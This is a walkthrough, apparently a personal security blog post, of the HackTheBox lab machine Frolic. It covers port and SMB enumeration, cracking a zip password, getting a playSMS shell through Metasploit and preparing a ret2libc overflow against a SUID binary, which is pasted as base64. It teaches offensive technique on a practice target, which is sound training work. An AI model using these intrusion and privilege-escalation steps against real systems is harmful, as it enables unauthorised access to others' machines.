---
title: HackTheBox - Frolic
date: 2020-12-29 21:24:41 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, esoteric langages, John The Ripper, zip2john, playSMS, CVE-2017-9101, SUID, pwn, ret2libc, decompilation, ghidra, gdb-peda, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/Frolic.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Frolic-full-port-scan.txt 10.10.10.111
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h28m47s, deviation: 3h10m30s, median: 21m11s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2020-12-29T19:29:20+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-29T13:59:20
|_  start_date: N/A
```

### enum4linux

![enum4linux users](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/enum4linux-users.png)

`enum4linux` allowed us to find two usernames:

- **sahay**
- **ayush**

### Samba (port 139,445)

![smb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/smb.png)

### Express/Node-RED (port 1880)

![node-red](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/1880-node-red.png)

![node-red](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/1880-dirb.png)

### nginx (port 9999)

![9999](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999.png)

![9999 dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-dirb.png)

#### `/test`

![test](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-test.png)

#### `/backup`

![backup](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-backup.png)

![backup-password](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-backup-password.png)

![backup-username](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-backup-username.png)

#### `/admin`

![admin](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-admin.png)

![admin-login-js](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-admin-login-js.png)

When we log in with these credentials, we are redirected to the following page:

![succes.html esoteric langage](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-esoteric.png)

##### ook langage

It seems that it's an esoteric langage like [**Ook!**](https://www.dcode.fr/langage-ook).

Indeed:

![ook! langage](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-esoteric-decoded.png)

Let's go to `/asdiSIAJJ0QWE9JAS`

#### `/asdiSIAJJ0QWE9JAS`

![//asdiSIAJJ0QWE9JAS](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-asdiSIAJJ0QWE9JAS.png)

It really looks like a base64 encoded string. Let's try to decode it:

![b64 to zip](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/b64.png)

Now we have a zip file. I tried the password `imnothuman` found on [http://10.10.10.111:9999/backup/password.txt](http://10.10.10.111:9999/backup/password.txt) but it didn't work.

##### zip2john

While waiting to find another password, I launched john. It turns out that the password was found almost instantly:

![zip2john](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/john-zip.png)

> In this case, the password found was `password` -_-

##### brainduck

![esoteric strings](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/esoteric-strings.png)

![brainfuck](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/brainfuck.png)

Seems `idkwhatispass` is another password.

#### `/dev`

![/dev](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-dev.png)

![/dev/backup](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-dev-backup.png)

#### `/playsms`

![/dev](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-playsms.png)

The credentials are:
- **username**: `admin`
- **password**: `idkwhatispass`

![/dev](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/9999-playsms-logged.png)

I didn't get the version but there are multiple exploits out here:

![searchsploit](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/playsms-searchsploit.png)

### reverse shell (metasploit)

Feeling lazy, so I decided to use `metasploit`:

![metasploit search playsms](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/msf-1.png)

![metasploit CVE-2017-9101](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/msf-2.png)

![metasploit CVE-2017-9101](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/msf-3.png)

## User (www-data)

```bash
python -c "import pty; pty.spawn('/bin/bash');"   
www-data@frolic:~/html/playsms$ cd /home
cd /home
www-data@frolic:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root  root  4096 Sep 23  2018 .
drwxr-xr-x 22 root  root  4096 Sep 23  2018 ..
drwxr-xr-x  3 ayush ayush 4096 Sep 25  2018 ayush
drwxr-xr-x  7 sahay sahay 4096 Sep 25  2018 sahay
www-data@frolic:/home$
```

- `ayush`'s flag:

```bash
www-data@frolic:/home$ cd ayush
cd ayush
www-data@frolic:/home/ayush$ ls -la
ls -la
total 36
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 .
drwxr-xr-x 4 root  root  4096 Sep 23  2018 ..
-rw------- 1 ayush ayush 2781 Sep 25  2018 .bash_history
-rw-r--r-- 1 ayush ayush  220 Sep 23  2018 .bash_logout
-rw-r--r-- 1 ayush ayush 3771 Sep 23  2018 .bashrc
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .binary
-rw-r--r-- 1 ayush ayush  655 Sep 23  2018 .profile
-rw------- 1 ayush ayush  965 Sep 25  2018 .viminfo
-rwxr-xr-x 1 ayush ayush   33 Sep 25  2018 user.txt
www-data@frolic:/home/ayush$ cat user.txt
cat user.txt
2ab95909cf509f85a6f476b59a0c2fe0
www-data@frolic:/home/ayush$
```

Let's see wtha's inside `.binary` directory:

```bash
www-data@frolic:/home/ayush$ cd .binary
cd .binary
www-data@frolic:/home/ayush/.binary$ ls -la
ls -la
total 16
drwxrwxr-x 2 ayush ayush 4096 Sep 25  2018 .
drwxr-xr-x 3 ayush ayush 4096 Sep 25  2018 ..
-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop
www-data@frolic:/home/ayush/.binary$
```

A SUID binary! Seems that's a way to privesc to root. 

Let's have a local copy and disassemble it.

A god way to do that is to base64 encode the binary's content and then copied the output in the clipboard.  

```bash
$ base64 rop
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
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwhAQIUIQECAAAAAABAAAAAQAAAAwAAAAMgwQI
DQAAAKSFBAgZAAAACJ8ECBsAAAAEAAAAGgAAAAyfBAgcAAAABAAAAPX+/2+sgQQIBQAAAEyCBAgG
AAAAzIEECAoAAABfAAAACwAAABAAAAAVAAAAAAAAAAMAAAAAoAQIAgAAACgAAAAUAAAAEQAAABcA
AADkggQIEQAAANyCBAgSAAAACAAAABMAAAAIAAAA/v//b7yCBAj///9vAQAAAPD//2+sggQIAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSfBAgAAAAA
AAAAAEaDBAhWgwQIZoMECHaDBAiGgwQIAAAAAAAAAABHQ0M6IChVYnVudHUgNS40LjAtNnVidW50
dTF+MTYuMDQuMTApIDUuNC4wIDIwMTYwNjA5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVIEECAAA
AAADAAEAAAAAAGiBBAgAAAAAAwACAAAAAACIgQQIAAAAAAMAAwAAAAAArIEECAAAAAADAAQAAAAA
AMyBBAgAAAAAAwAFAAAAAABMggQIAAAAAAMABgAAAAAArIIECAAAAAADAAcAAAAAALyCBAgAAAAA
AwAIAAAAAADcggQIAAAAAAMACQAAAAAA5IIECAAAAAADAAoAAAAAAAyDBAgAAAAAAwALAAAAAAAw
gwQIAAAAAAMADAAAAAAAkIMECAAAAAADAA0AAAAAAKCDBAgAAAAAAwAOAAAAAACkhQQIAAAAAAMA
DwAAAAAAuIUECAAAAAADABAAAAAAAPCFBAgAAAAAAwARAAAAAAAkhgQIAAAAAAMAEgAAAAAACJ8E
CAAAAAADABMAAAAAAAyfBAgAAAAAAwAUAAAAAAAQnwQIAAAAAAMAFQAAAAAAFJ8ECAAAAAADABYA
AAAAAPyfBAgAAAAAAwAXAAAAAAAAoAQIAAAAAAMAGAAAAAAAIKAECAAAAAADABkAAAAAACigBAgA
AAAAAwAaAAAAAAAAAAAAAAAAAAMAGwABAAAAAAAAAAAAAAAEAPH/DAAAABCfBAgAAAAAAQAVABkA
AADggwQIAAAAAAIADgAbAAAAEIQECAAAAAACAA4ALgAAAFCEBAgAAAAAAgAOAEQAAAAooAQIAQAA
AAEAGgBTAAAADJ8ECAAAAAABABQAegAAAHCEBAgAAAAAAgAOAIYAAAAInwQIAAAAAAEAEwClAAAA
AAAAAAAAAAAEAPH/AQAAAAAAAAAAAAAABADx/6sAAAAUhwQIAAAAAAEAEgC5AAAAEJ8ECAAAAAAB
ABUAAAAAAAAAAAAAAAAABADx/8UAAAAMnwQIAAAAAAAAEwDWAAAAFJ8ECAAAAAABABYA3wAAAAif
BAgAAAAAAAATAPIAAADwhQQIAAAAAAAAEQAFAQAAAKAECAAAAAABABgAGwEAAKCFBAgCAAAAEgAO
ACsBAAAAAAAAAAAAACAAAABHAQAA0IMECAQAAAASAg4AjwEAACCgBAgAAAAAIAAZAF0BAAAAAAAA
AAAAABIAAABvAQAA+IQECDoAAAASAA4AdAEAACigBAgAAAAAEAAZACUBAACkhQQIAAAAABIADwB7
AQAAAAAAAAAAAAASAAAAjQEAACCgBAgAAAAAEAAZAJoBAAAAAAAAAAAAABIAAACqAQAAAAAAAAAA
AAAgAAAAuQEAACSgBAgAAAAAEQIZAMYBAAC8hQQIBAAAABEAEADVAQAAAAAAAAAAAAASAAAA8gEA
AECFBAhdAAAAEgAOANEAAAAsoAQIAAAAABAAGgCTAQAAoIMECAAAAAASAA4AAgIAALiFBAgEAAAA
EQAQAAkCAAAooAQIAAAAABAAGgAVAgAAm4QECF0AAAASAA4AGgIAAAAAAAAAAAAAEgAAACwCAAAA
AAAAAAAAACAAAABAAgAAKKAECAAAAAARAhkATAIAAAAAAAAAAAAAIAAAAPwBAAAMgwQIAAAAABIA
CwAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9i
YWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43MjA5AF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2Fy
cmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQByb3Au
YwBfX0ZSQU1FX0VORF9fAF9fSkNSX0VORF9fAF9faW5pdF9hcnJheV9lbmQAX0RZTkFNSUMAX19p
bml0X2FycmF5X3N0YXJ0AF9fR05VX0VIX0ZSQU1FX0hEUgBfR0xPQkFMX09GRlNFVF9UQUJMRV8A
X19saWJjX2NzdV9maW5pAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfX3g4Ni5nZXRfcGNf
dGh1bmsuYngAcHJpbnRmQEBHTElCQ18yLjAAdnVsbgBfZWRhdGEAc3RyY3B5QEBHTElCQ18yLjAA
X19kYXRhX3N0YXJ0AHB1dHNAQEdMSUJDXzIuMABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUA
X0lPX3N0ZGluX3VzZWQAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMABfX2xpYmNfY3N1X2lu
aXQAX2ZwX2h3AF9fYnNzX3N0YXJ0AG1haW4Ac2V0dWlkQEBHTElCQ18yLjAAX0p2X1JlZ2lzdGVy
Q2xhc3NlcwBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAAAuc3ltdGFiAC5z
dHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQA
LmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJl
bC5keW4ALnJlbC5wbHQALmluaXQALnBsdC5nb3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJh
bWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuamNyAC5keW5hbWljAC5n
b3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAABsAAAABAAAAAgAAAFSBBAhUAQAAEwAAAAAAAAAAAAAAAQAAAAAAAAAjAAAABwAA
AAIAAABogQQIaAEAACAAAAAAAAAAAAAAAAQAAAAAAAAAMQAAAAcAAAACAAAAiIEECIgBAAAkAAAA
AAAAAAAAAAAEAAAAAAAAAEQAAAD2//9vAgAAAKyBBAisAQAAIAAAAAUAAAAAAAAABAAAAAQAAABO
AAAACwAAAAIAAADMgQQIzAEAAIAAAAAGAAAAAQAAAAQAAAAQAAAAVgAAAAMAAAACAAAATIIECEwC
AABfAAAAAAAAAAAAAAABAAAAAAAAAF4AAAD///9vAgAAAKyCBAisAgAAEAAAAAUAAAAAAAAAAgAA
AAIAAABrAAAA/v//bwIAAAC8ggQIvAIAACAAAAAGAAAAAQAAAAQAAAAAAAAAegAAAAkAAAACAAAA
3IIECNwCAAAIAAAABQAAAAAAAAAEAAAACAAAAIMAAAAJAAAAQgAAAOSCBAjkAgAAKAAAAAUAAAAY
AAAABAAAAAgAAACMAAAAAQAAAAYAAAAMgwQIDAMAACMAAAAAAAAAAAAAAAQAAAAAAAAAhwAAAAEA
AAAGAAAAMIMECDADAABgAAAAAAAAAAAAAAAQAAAABAAAAJIAAAABAAAABgAAAJCDBAiQAwAACAAA
AAAAAAAAAAAACAAAAAAAAACbAAAAAQAAAAYAAACggwQIoAMAAAICAAAAAAAAAAAAABAAAAAAAAAA
oQAAAAEAAAAGAAAApIUECKQFAAAUAAAAAAAAAAAAAAAEAAAAAAAAAKcAAAABAAAAAgAAALiFBAi4
BQAAOAAAAAAAAAAAAAAABAAAAAAAAACvAAAAAQAAAAIAAADwhQQI8AUAADQAAAAAAAAAAAAAAAQA
AAAAAAAAvQAAAAEAAAACAAAAJIYECCQGAAD0AAAAAAAAAAAAAAAEAAAAAAAAAMcAAAAOAAAAAwAA
AAifBAgIDwAABAAAAAAAAAAAAAAABAAAAAAAAADTAAAADwAAAAMAAAAMnwQIDA8AAAQAAAAAAAAA
AAAAAAQAAAAAAAAA3wAAAAEAAAADAAAAEJ8ECBAPAAAEAAAAAAAAAAAAAAAEAAAAAAAAAOQAAAAG
AAAAAwAAABSfBAgUDwAA6AAAAAYAAAAAAAAABAAAAAgAAACWAAAAAQAAAAMAAAD8nwQI/A8AAAQA
AAAAAAAAAAAAAAQAAAAEAAAA7QAAAAEAAAADAAAAAKAECAAQAAAgAAAAAAAAAAAAAAAEAAAABAAA
APYAAAABAAAAAwAAACCgBAggEAAACAAAAAAAAAAAAAAABAAAAAAAAAD8AAAACAAAAAMAAAAooAQI
KBAAAAQAAAAAAAAAAAAAAAEAAAAAAAAAAQEAAAEAAAAwAAAAAAAAACgQAAA1AAAAAAAAAAAAAAAB
AAAAAQAAABEAAAADAAAAAAAAAAAAAABWFwAACgEAAAAAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAA
AAAAAAAAYBAAAJAEAAAeAAAALwAAAAQAAAAQAAAACQAAAAMAAAAAAAAAAAAAAPAUAABmAgAAAAAA
AAAAAAABAAAAAAAAAA==
```

### Architecture

First thing first, what is the context ? What kind of architecture are we dealing with ?

```bash
$ uname -a
Linux frolic 4.4.0-116-generic 140-Ubuntu SMP Mon Feb 12 21:22:43 UTC 2018 i686 athlon i686 GNU/Linux
```

`i686` okay so this is a **32 bits machine**!

I checked if the **ASLR** was enabled on the target:

```
$ cat /proc/sys/kernel/randomize_va_space
0
```

Fine, it is not enabled. 


### Using a decompiler

I passed the binary to `ghidra`, and we see that `strcpy` is called with an unchecked parameter. 

We're facing with a typical buffer overflow challenge.

![ghidra main](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/rop-decompiled.png)

![ghidra vuln](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/rop-decompiled-vuln.png)


### checksec

Then, let's run `checksec` within `gdb-peda`:

![checksec](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/checksec.png)`

### Calculating the offset

![gdb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/frolic/gdb-peda.png)

Our goal is to gain an access to root shell, so we have to find a way to call the `system` function with `"/bin/sh"` as an argument. Here are the steps:

### Libc address

1. Get libc address (`0xb7e19000`) using `ldd`:

```bash
$ ldd rop
        linux-gate.so.1 =>  (0xb7fda000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
```

### `system` and `exit` addresses

2. Locate the addresses of `system` (`0x0003ada0`) and `exit` (`0x0002e9d0`) functions: 

```bash
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

```bash
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
